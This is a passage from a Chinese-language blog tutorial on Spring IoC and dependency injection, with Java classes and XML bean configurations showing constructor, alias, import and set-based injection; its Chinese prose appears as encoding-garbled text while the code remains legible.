&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªSetæ–¹æ³•ï¼Œè®©userDaoå…è®¸ç”¨æˆ·çš„è‡ªå®šä¹‰åˆ›å»ºï¼Œé‚£ä¹ˆä»–éœ€è¦ä»€ä¹ˆæˆ‘ä»¬å°±ç»™ä»€ä¹ˆ~</p>
<p>æœ€ç»ˆæµ‹è¯•ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ys.dao.UserDao;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserDaoimpl;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserMysql;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserSQLServer;</span><br><span class="line"><span class="keyword">import</span> com.ys.service.UserService;</span><br><span class="line"><span class="keyword">import</span> com.ys.service.UserServiceimpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInMine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        ç”¨æˆ·å®é™…è°ƒç”¨çš„æ˜¯ä¸šåŠ¡å±‚ï¼ŒDaoå±‚ä¸å…è®¸ä»–ä»¬æ¥è§¦ï¼</span></span><br><span class="line">        UserServiceimpl userServiceimpl = <span class="keyword">new</span> UserServiceimpl();</span><br><span class="line"></span><br><span class="line">        userServiceimpl.setUserDao(<span class="keyword">new</span> UserSQLServer());</span><br><span class="line"></span><br><span class="line">        userServiceimpl.getUser();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯åœ¨springå½“ä¸­ï¼Œspringå¸®æˆ‘ä»¬æ“ä½œäº†ä»€ä¹ˆï¼Ÿ</p>
<p>æˆ‘ä»¬æ²¡æœ‰NEWä»»ä½•ä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬åšçš„æ˜¯å»Springçš„beanä¸‹é…ç½®xml~</p>
<p>æˆ‘ä»¬å¦‚ä¸‹æ„é€ xmlï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    ä½¿ç”¨springæ¥åˆ›å»ºæˆ‘ä»¬çš„å¯¹è±¡,åœ¨springä¸­éƒ½æˆä¸ºBean--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    ç°åœ¨ä¸€ä¸ªBeanç›¸å½“äºnew äº†ä¸€ä¸ªå¯¹è±¡--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--   æˆ‘ä»¬åœ¨XMLå½“ä¸­å»é…ç½®äº†--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userMySQL&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserMysql&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userOranle&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserOranle&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userSQLServer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserSQLServer&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userServiceimpl&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.service.UserServiceimpl&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;userMySQL&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>bean å°±ç›¸å½“äºnewäº†è¿™ä¹ˆä¸€ä¸ªç±»ï¼Œrefåˆ™æ˜¯å–beanå½“ä¸­å·²ç»åˆ›å»ºå¥½çš„ç±»ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬çš„æµ‹è¯•ä»£ç ä¿®æ”¹åä¸ºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ys.service.UserServiceimpl;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInMine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean1.xml&quot;</span>);</span><br><span class="line">        UserServiceimpl userServiceimpl = (UserServiceimpl) 		      context.getBean(<span class="string">&quot;userServiceimpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        userServiceimpl.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼"><a href="#2-IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼" class="headerlink" title="2 IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼"></a>2 IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼</h1><p>1.ä½¿ç”¨æ— å‚æ„é€  é»˜è®¤åˆ›å»º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public User()&#123;</span></span><br><span class="line"><span class="comment">////        System.out.println(&quot;wdndmd&quot;);</span></span><br><span class="line"><span class="comment">////    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘åœ¨è¿™ç›´æ¥å°†æ— å‚æ„é€ å»é™¤ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°æ— æ³•æ„å»ºçš„é—®é¢˜ï¼Œä½†æ˜¯Springä¹Ÿæ”¯æŒä½¿ç”¨æœ‰å‚æ„é€ </p>
<p>æ„é€ å™¨å‡½æ•°æœ‰ä¸‰ç§æ–¹å¼ï¼š</p>
<ul>
<li><p>ç¬¬ä¸€ç§ï¼Œä¸‹æ ‡èµ‹å€¼</p>
</li>
<li><pre><code class="xml">&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt;
    &lt;constructor-arg index=&quot;0&quot; value=&quot;wdnmd&quot;/&gt;
&lt;/bean&gt;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ ç¬¬äºŒç§ï¼Œå‚æ•°ç±»å‹åŒ¹é…</span><br><span class="line"></span><br><span class="line">+ &#96;&#96;&#96;xml</span><br><span class="line">  &lt;bean id&#x3D;&quot;user&quot; class&#x3D;&quot;com.ys.pojo.User&quot;&gt;</span><br><span class="line">      &lt;constructor-arg type&#x3D;&quot;java.lang.String&quot; value&#x3D;&quot;www&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;bean&gt;</span><br></pre></td></tr></table></figure></code></pre>
</li>
<li><p>é€šè¿‡å‚æ•°åæ¥è¿›è¡Œèµ‹å€¼</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;www&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>è¦æ³¨æ„ï¼š</p>
<ul>
<li>æˆ‘ä»¬å¦‚æœä½¿ç”¨äº†æœ‰å‚æ„é€ ï¼Œspringå°±ä¸ä¼šèµ°æ— å‚æ„é€ çš„æ–¹æ³•äº†</li>
<li>åªè¦æˆ‘ä»¬ä½¿ç”¨new ClassPathXmlApplicationContextåˆ›å»ºï¼Œå°±ä¼šæŠŠXMLå½“ä¸­çš„ç±»å…¨éƒ¨æ³¨å…¥è¿›å»ï¼Œåˆ›å»ºæ–°ç±»</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserT</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;userTè¢«åˆ›å»ºäº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserT</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚æˆ‘ä»¬åˆ›å»ºè¯¥javaç±»</p>
<p>å¹¶åœ¨beanä¸­æ‰«æï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;user&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¾¿ä¸ä¼šå¾—åˆ°æ„é€ å™¨åº”è¯¥è¿”å›é‚£å¥è¯ï¼Œä½†å¦‚æœæˆ‘ä»¬å»æ‰ä¸Šé¢çš„</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ™ä¼šå¾—åˆ°æ„é€ å™¨å½“ä¸­çš„è¯</p>
<p>åŒæ—¶æˆ‘ä»¬è¦çŸ¥é“ï¼Œæˆ‘ä»¬åˆ›å»ºçš„æ—¶å€™æ˜¯ä¸€æ ·çš„beanï¼Œå¯¹è±¡å¹¶æ²¡æœ‰åŒºåˆ«ï¼š</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User user = (User) context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">User user2 = (User)context.getBean(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>ä¸¤è€…æ˜¯æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>æ‰€ä»¥åœ¨é…ç½®æ–‡ä»¶åŠ è½½çš„æ—¶å€™ï¼Œå®¹å™¨ä¸­ç®¡ç†çš„å¯¹è±¡å°±å·²ç»åˆå§‹åŒ–äº†</p>
<h1 id="3-Springé…ç½®"><a href="#3-Springé…ç½®" class="headerlink" title="3. Springé…ç½®"></a>3. Springé…ç½®</h1><h2 id="3-1-åˆ«å"><a href="#3-1-åˆ«å" class="headerlink" title="3.1 åˆ«å"></a>3.1 åˆ«å</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">alias</span> <span class="attr">name</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;dnm&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨è¿™æ ·å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªåˆ«åé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userT2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    User user = (User) context.getBean(<span class="string">&quot;user2&quot;</span>);</span><br><span class="line">    User user2 = (User)context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    System.out.println(user==user2);</span><br><span class="line">    user.show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•åæ˜¯ä¸€æ ·çš„</p>
<p>è€Œä¸”åˆ©ç”¨nameçš„æ–¹å¼å¯ä»¥èµ·å¤šä¸ªåˆ«å</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user2,u2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="3-2-Beançš„é…ç½®"><a href="#3-2-Beançš„é…ç½®" class="headerlink" title="3.2 Beançš„é…ç½®"></a>3.2 Beançš„é…ç½®</h2><h2 id="3-3-import"><a href="#3-3-import" class="headerlink" title="3.3 import"></a>3.3 import</h2><p>importä¸€èˆ¬è¢«æˆ‘ä»¬ç”¨äºä½¿ç”¨å›¢é˜Ÿå¼€å‘ä½¿ç”¨ï¼Œå®ƒå¯ä»¥å°†å¤šä¸ªé…ç½®æ–‡ä»¶å¯¼å…¥åˆå¹¶ä¸ºä¸€ä¸ªï¼Œæ–¹ä¾¿ç¨‹åºå‘˜ä¹‹é—´äº’ç›¸åä½œã€‚</p>
<p>ä¾‹å¦‚æˆ‘å…ˆåˆ›å»ºäº†å¦‚ä¸‹ä¸‰ä¸ªé…ç½®çš„xmlï¼š</p>
<p>beans1.xml ,applicationContext.xml ä»¥åŠbeans.xml</p>
<p>åœ¨mainå‡½æ•°å½“ä¸­æˆ‘å´åªæƒ³ä½¿ç”¨ä¸€ä¸ªï¼Œè¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿï¼Œè¿™æ ·æˆ‘ä»¬åº”è¯¥ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans1.xml&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åå†å›åˆ°Mytestå½“ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±ç›¸å½“äºä¸€å£æ°”ç»„ç»‡äº†ä¸‰ä¸ªxmlæ–‡ä»¶</p>
<p>åŒæ—¶å†å›åˆ°å‰é¢çš„åˆ«åçš„ä½¿ç”¨ï¼Œè¿™æ ·çš„åˆ«åä¾¿äºæˆ‘ä»¬importåˆå¹¶çš„æ—¶å€™å°†ä»–ä»¬åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¼šé˜»æ­¢é‡å¤çš„æƒ…å†µ</p>
<h1 id="4-ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰"><a href="#4-ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰" class="headerlink" title="4 ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰"></a>4 ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰</h1><h2 id="4-1-æ„é€ å™¨æ³¨å…¥"><a href="#4-1-æ„é€ å™¨æ³¨å…¥" class="headerlink" title="4.1 æ„é€ å™¨æ³¨å…¥"></a>4.1 æ„é€ å™¨æ³¨å…¥</h2><p>å‰é¢å·²ç»è¯´è¿‡</p>
<h2 id="4-2-SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘"><a href="#4-2-SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘" class="headerlink" title="4.2 SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘"></a>4.2 SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘</h2><ul>
<li>ä¾èµ–æ³¨å…¥ï¼šæœ¬è´¨å°±æ˜¯setæ³¨å…¥ï¼<ul>
<li>ä¾èµ–ä»€ä¹ˆï¼Ÿ<ul>
<li>beanå¯¹è±¡çš„åˆ›å»ºä¾èµ–äºå®¹å™¨</li>
</ul>
</li>
<li>æ³¨å…¥ä»€ä¹ˆï¼Ÿ<ul>
<li>beanå¯¹è±¡ä¸­çš„æ‰€æœ‰å±æ€§ç”±å®¹å™¨æ¥æ³¨å…¥</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>å…³äºå¤æ‚ç±»å‹ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦æ˜ç™½listï¼Œsetï¼Œmapéƒ½æ˜¯æ¥åšä»€ä¹ˆçš„ï¼Œä»¥åŠä»–ä»¬çš„åŒºåˆ«</p>
<p>è¯¦ç»†æˆ‘å†³å®šå†™åœ¨JAVAåŸºç¡€é‡Œé¢ã€‚</p>
<p>ã€ç¯å¢ƒæ­å»ºã€‘</p>
<p>1.å¤æ‚ç±»å‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Address</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2.çœŸå®æµ‹è¯•å¯¹è±¡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String[] books;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; cards;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br></pre></td></tr></table></figure>

<p>è¿™äº›å¯¹è±¡çš„å„ç§æ³¨å…¥æ–¹æ³•ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Beanæ³¨å…¥ï¼Œä½¿ç”¨ref--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;address1&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaåŸºç¡€<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Javaè¿›ç¨‹<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Javaç¼–å†™<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaIOC<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaSpring<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cards&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;æœˆæ›œ&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1751111&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;æœˆçŸ³&quot;</span> <span class="attr">value</span>=<span class="string">&quot;138217&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;games&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>æˆ˜åœ°<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>ä½¿å‘½å¬å”¤<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>EA<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>å¥¥é‡Œç»™<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>å”±æ­Œ<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>ä¸‹æ£‹<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>ç¡è§‰<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;url&quot;</span>&gt;</span>/weibos?SSL=xxx<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;divers&quot;</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;username&quot;</span>&gt;</span>æœˆçŸ³<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;password&quot;</span>&gt;</span>æœˆæ›œ<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;wife&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 